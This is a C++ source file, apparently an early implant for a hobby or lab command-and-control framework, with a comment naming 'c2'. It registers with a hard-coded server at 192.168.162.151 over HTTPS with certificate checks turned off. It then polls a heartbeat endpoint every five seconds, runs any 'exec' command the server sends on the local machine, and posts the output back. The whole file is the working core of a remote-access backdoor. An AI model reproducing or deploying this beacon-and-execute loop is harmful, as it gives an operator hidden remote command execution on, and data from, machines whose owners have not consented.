// http-lib-test.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//
#include <iostream>

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "include/httplib.h"
#include "include/Serialization.h"
#include "include/Commands.h"
using namespace std;








string getHeartBeat(httplib::Client& client, string sessionId) {


    auto HBSerialized = nlohmann::json{
     { "sessionId", sessionId }
    };

    string heartBeatBody = HBSerialized.dump(); 
    cout << "HeartBeatBody: " << heartBeatBody << endl;
    httplib::Headers headers = {
    {"Content-Type", "application/json"}
    };

    auto result = client.Post("/heartBeat", headers, heartBeatBody, "application/json");
    if (!result) {
        cout << "Can't get heartBeat :/" << endl;
        return "error";
    }

   

    int status = result->status;
    string body = result->body;
    cout << "Status: " << status << endl;
    cout << "Body: " << body << endl;

    return body;

};

void sendResponse(httplib::Client& client, std::string sessionId, std::string type, std::string status, std::string message){
    ReqHeartBeat reqResponse = ReqHeartBeat{ sessionId, type, status, message };
    auto body = nlohmann::json{
        {"sessionId", sessionId},
        {"type", type},
        {"status", status},
        {"message", message}
    };

    std::string reqBody = body.dump();

    httplib::Headers headers = {
    {"Content-Type", "application/json"}
    };

    auto regRes = client.Post("/heartBeat", headers, reqBody, "application/json");
    if (!regRes) {
        cout << "Can't register :/" << endl;
        return;
    }

    if (regRes->status == 200) {
        cout << "Response sent!" << endl;
    }
}

int interpreter(httplib::Client& client,string sessionId,  string deserialisedJsonObj) {
    cout << "[INTERPRETER] ==> " << deserialisedJsonObj << endl;

    nlohmann::json cmdJsonObj = nlohmann::json::parse(deserialisedJsonObj);
    
    ResHeartBeat serializedCmd = cmdJsonObj.get<ResHeartBeat>();
    
    cout << "[INTERPRETER] ==> De-serialised command: type: " << serializedCmd.Type << endl;
    
    for (const auto& arg : serializedCmd.Args) {
        cout << "-> " << arg << endl;
        
    }

    if (serializedCmd.Type == "exec") {
        std::string result = execCommandFromList(serializedCmd.Args);
        sendResponse(client, sessionId, "exec", "OK", result);
    }


    return 0;
}





int main()
{
    
    
    std::cout << "Hello World!\n";
    httplib::Client cli("https://192.168.162.151");
    cli.enable_server_certificate_verification(false);

    auto res = cli.Get("/getSID");

    if (!res) {
        cout << "no res :/" << endl;
        return -1;

    }


    int status = res->status;
    string body = res->body;
    cout << "Status: " << status << endl;
    cout << "Body: " << body << endl;

    nlohmann::json resSIDjsonObj = nlohmann::json::parse(body);
    ResGetSid resGetSessId = resSIDjsonObj.get<ResGetSid>();

    cout << "sessionId: " << resGetSessId.sessionId << "; welcomeMsg: " << resGetSessId.welcomeMsg << endl;



    //ReqRegister req = { body };
    auto regSerialized = nlohmann::json{
        { "sessionId", resGetSessId.sessionId }
};

    string registerBody = regSerialized.dump();
    httplib::Headers headers = {
    {"Content-Type", "application/json"}
    };

    auto regRes = cli.Post("/register", headers, registerBody, "application/json");
    if (!regRes) {
        cout << "Can't register :/" << endl;
        return -1;
    }

    int regResStatus = regRes->status;

    if (regResStatus != 200) {
        cout << "Server error :/" << endl;
        return -1;
    }
    string regResBody = regRes->body;
    cout << "Status: " << regResStatus << "; Body: " << regResBody << endl;

    nlohmann::json resRegjsonObj = nlohmann::json::parse(regResBody);
    ResRegister resRegister = resRegjsonObj.get<ResRegister>();

    


    if (resRegister.resMsg == "OK") {
        cout << "Succesfully registered Yiiipiee" << endl;
    }

    string sessionId = resGetSessId.sessionId;
    while (1) {
        string response = getHeartBeat(cli, sessionId);
        // TODO: Manage error codes / reporting errors to c2
        int returnCode = interpreter(cli, sessionId, response); 
        Sleep(5000);
    }
    

}
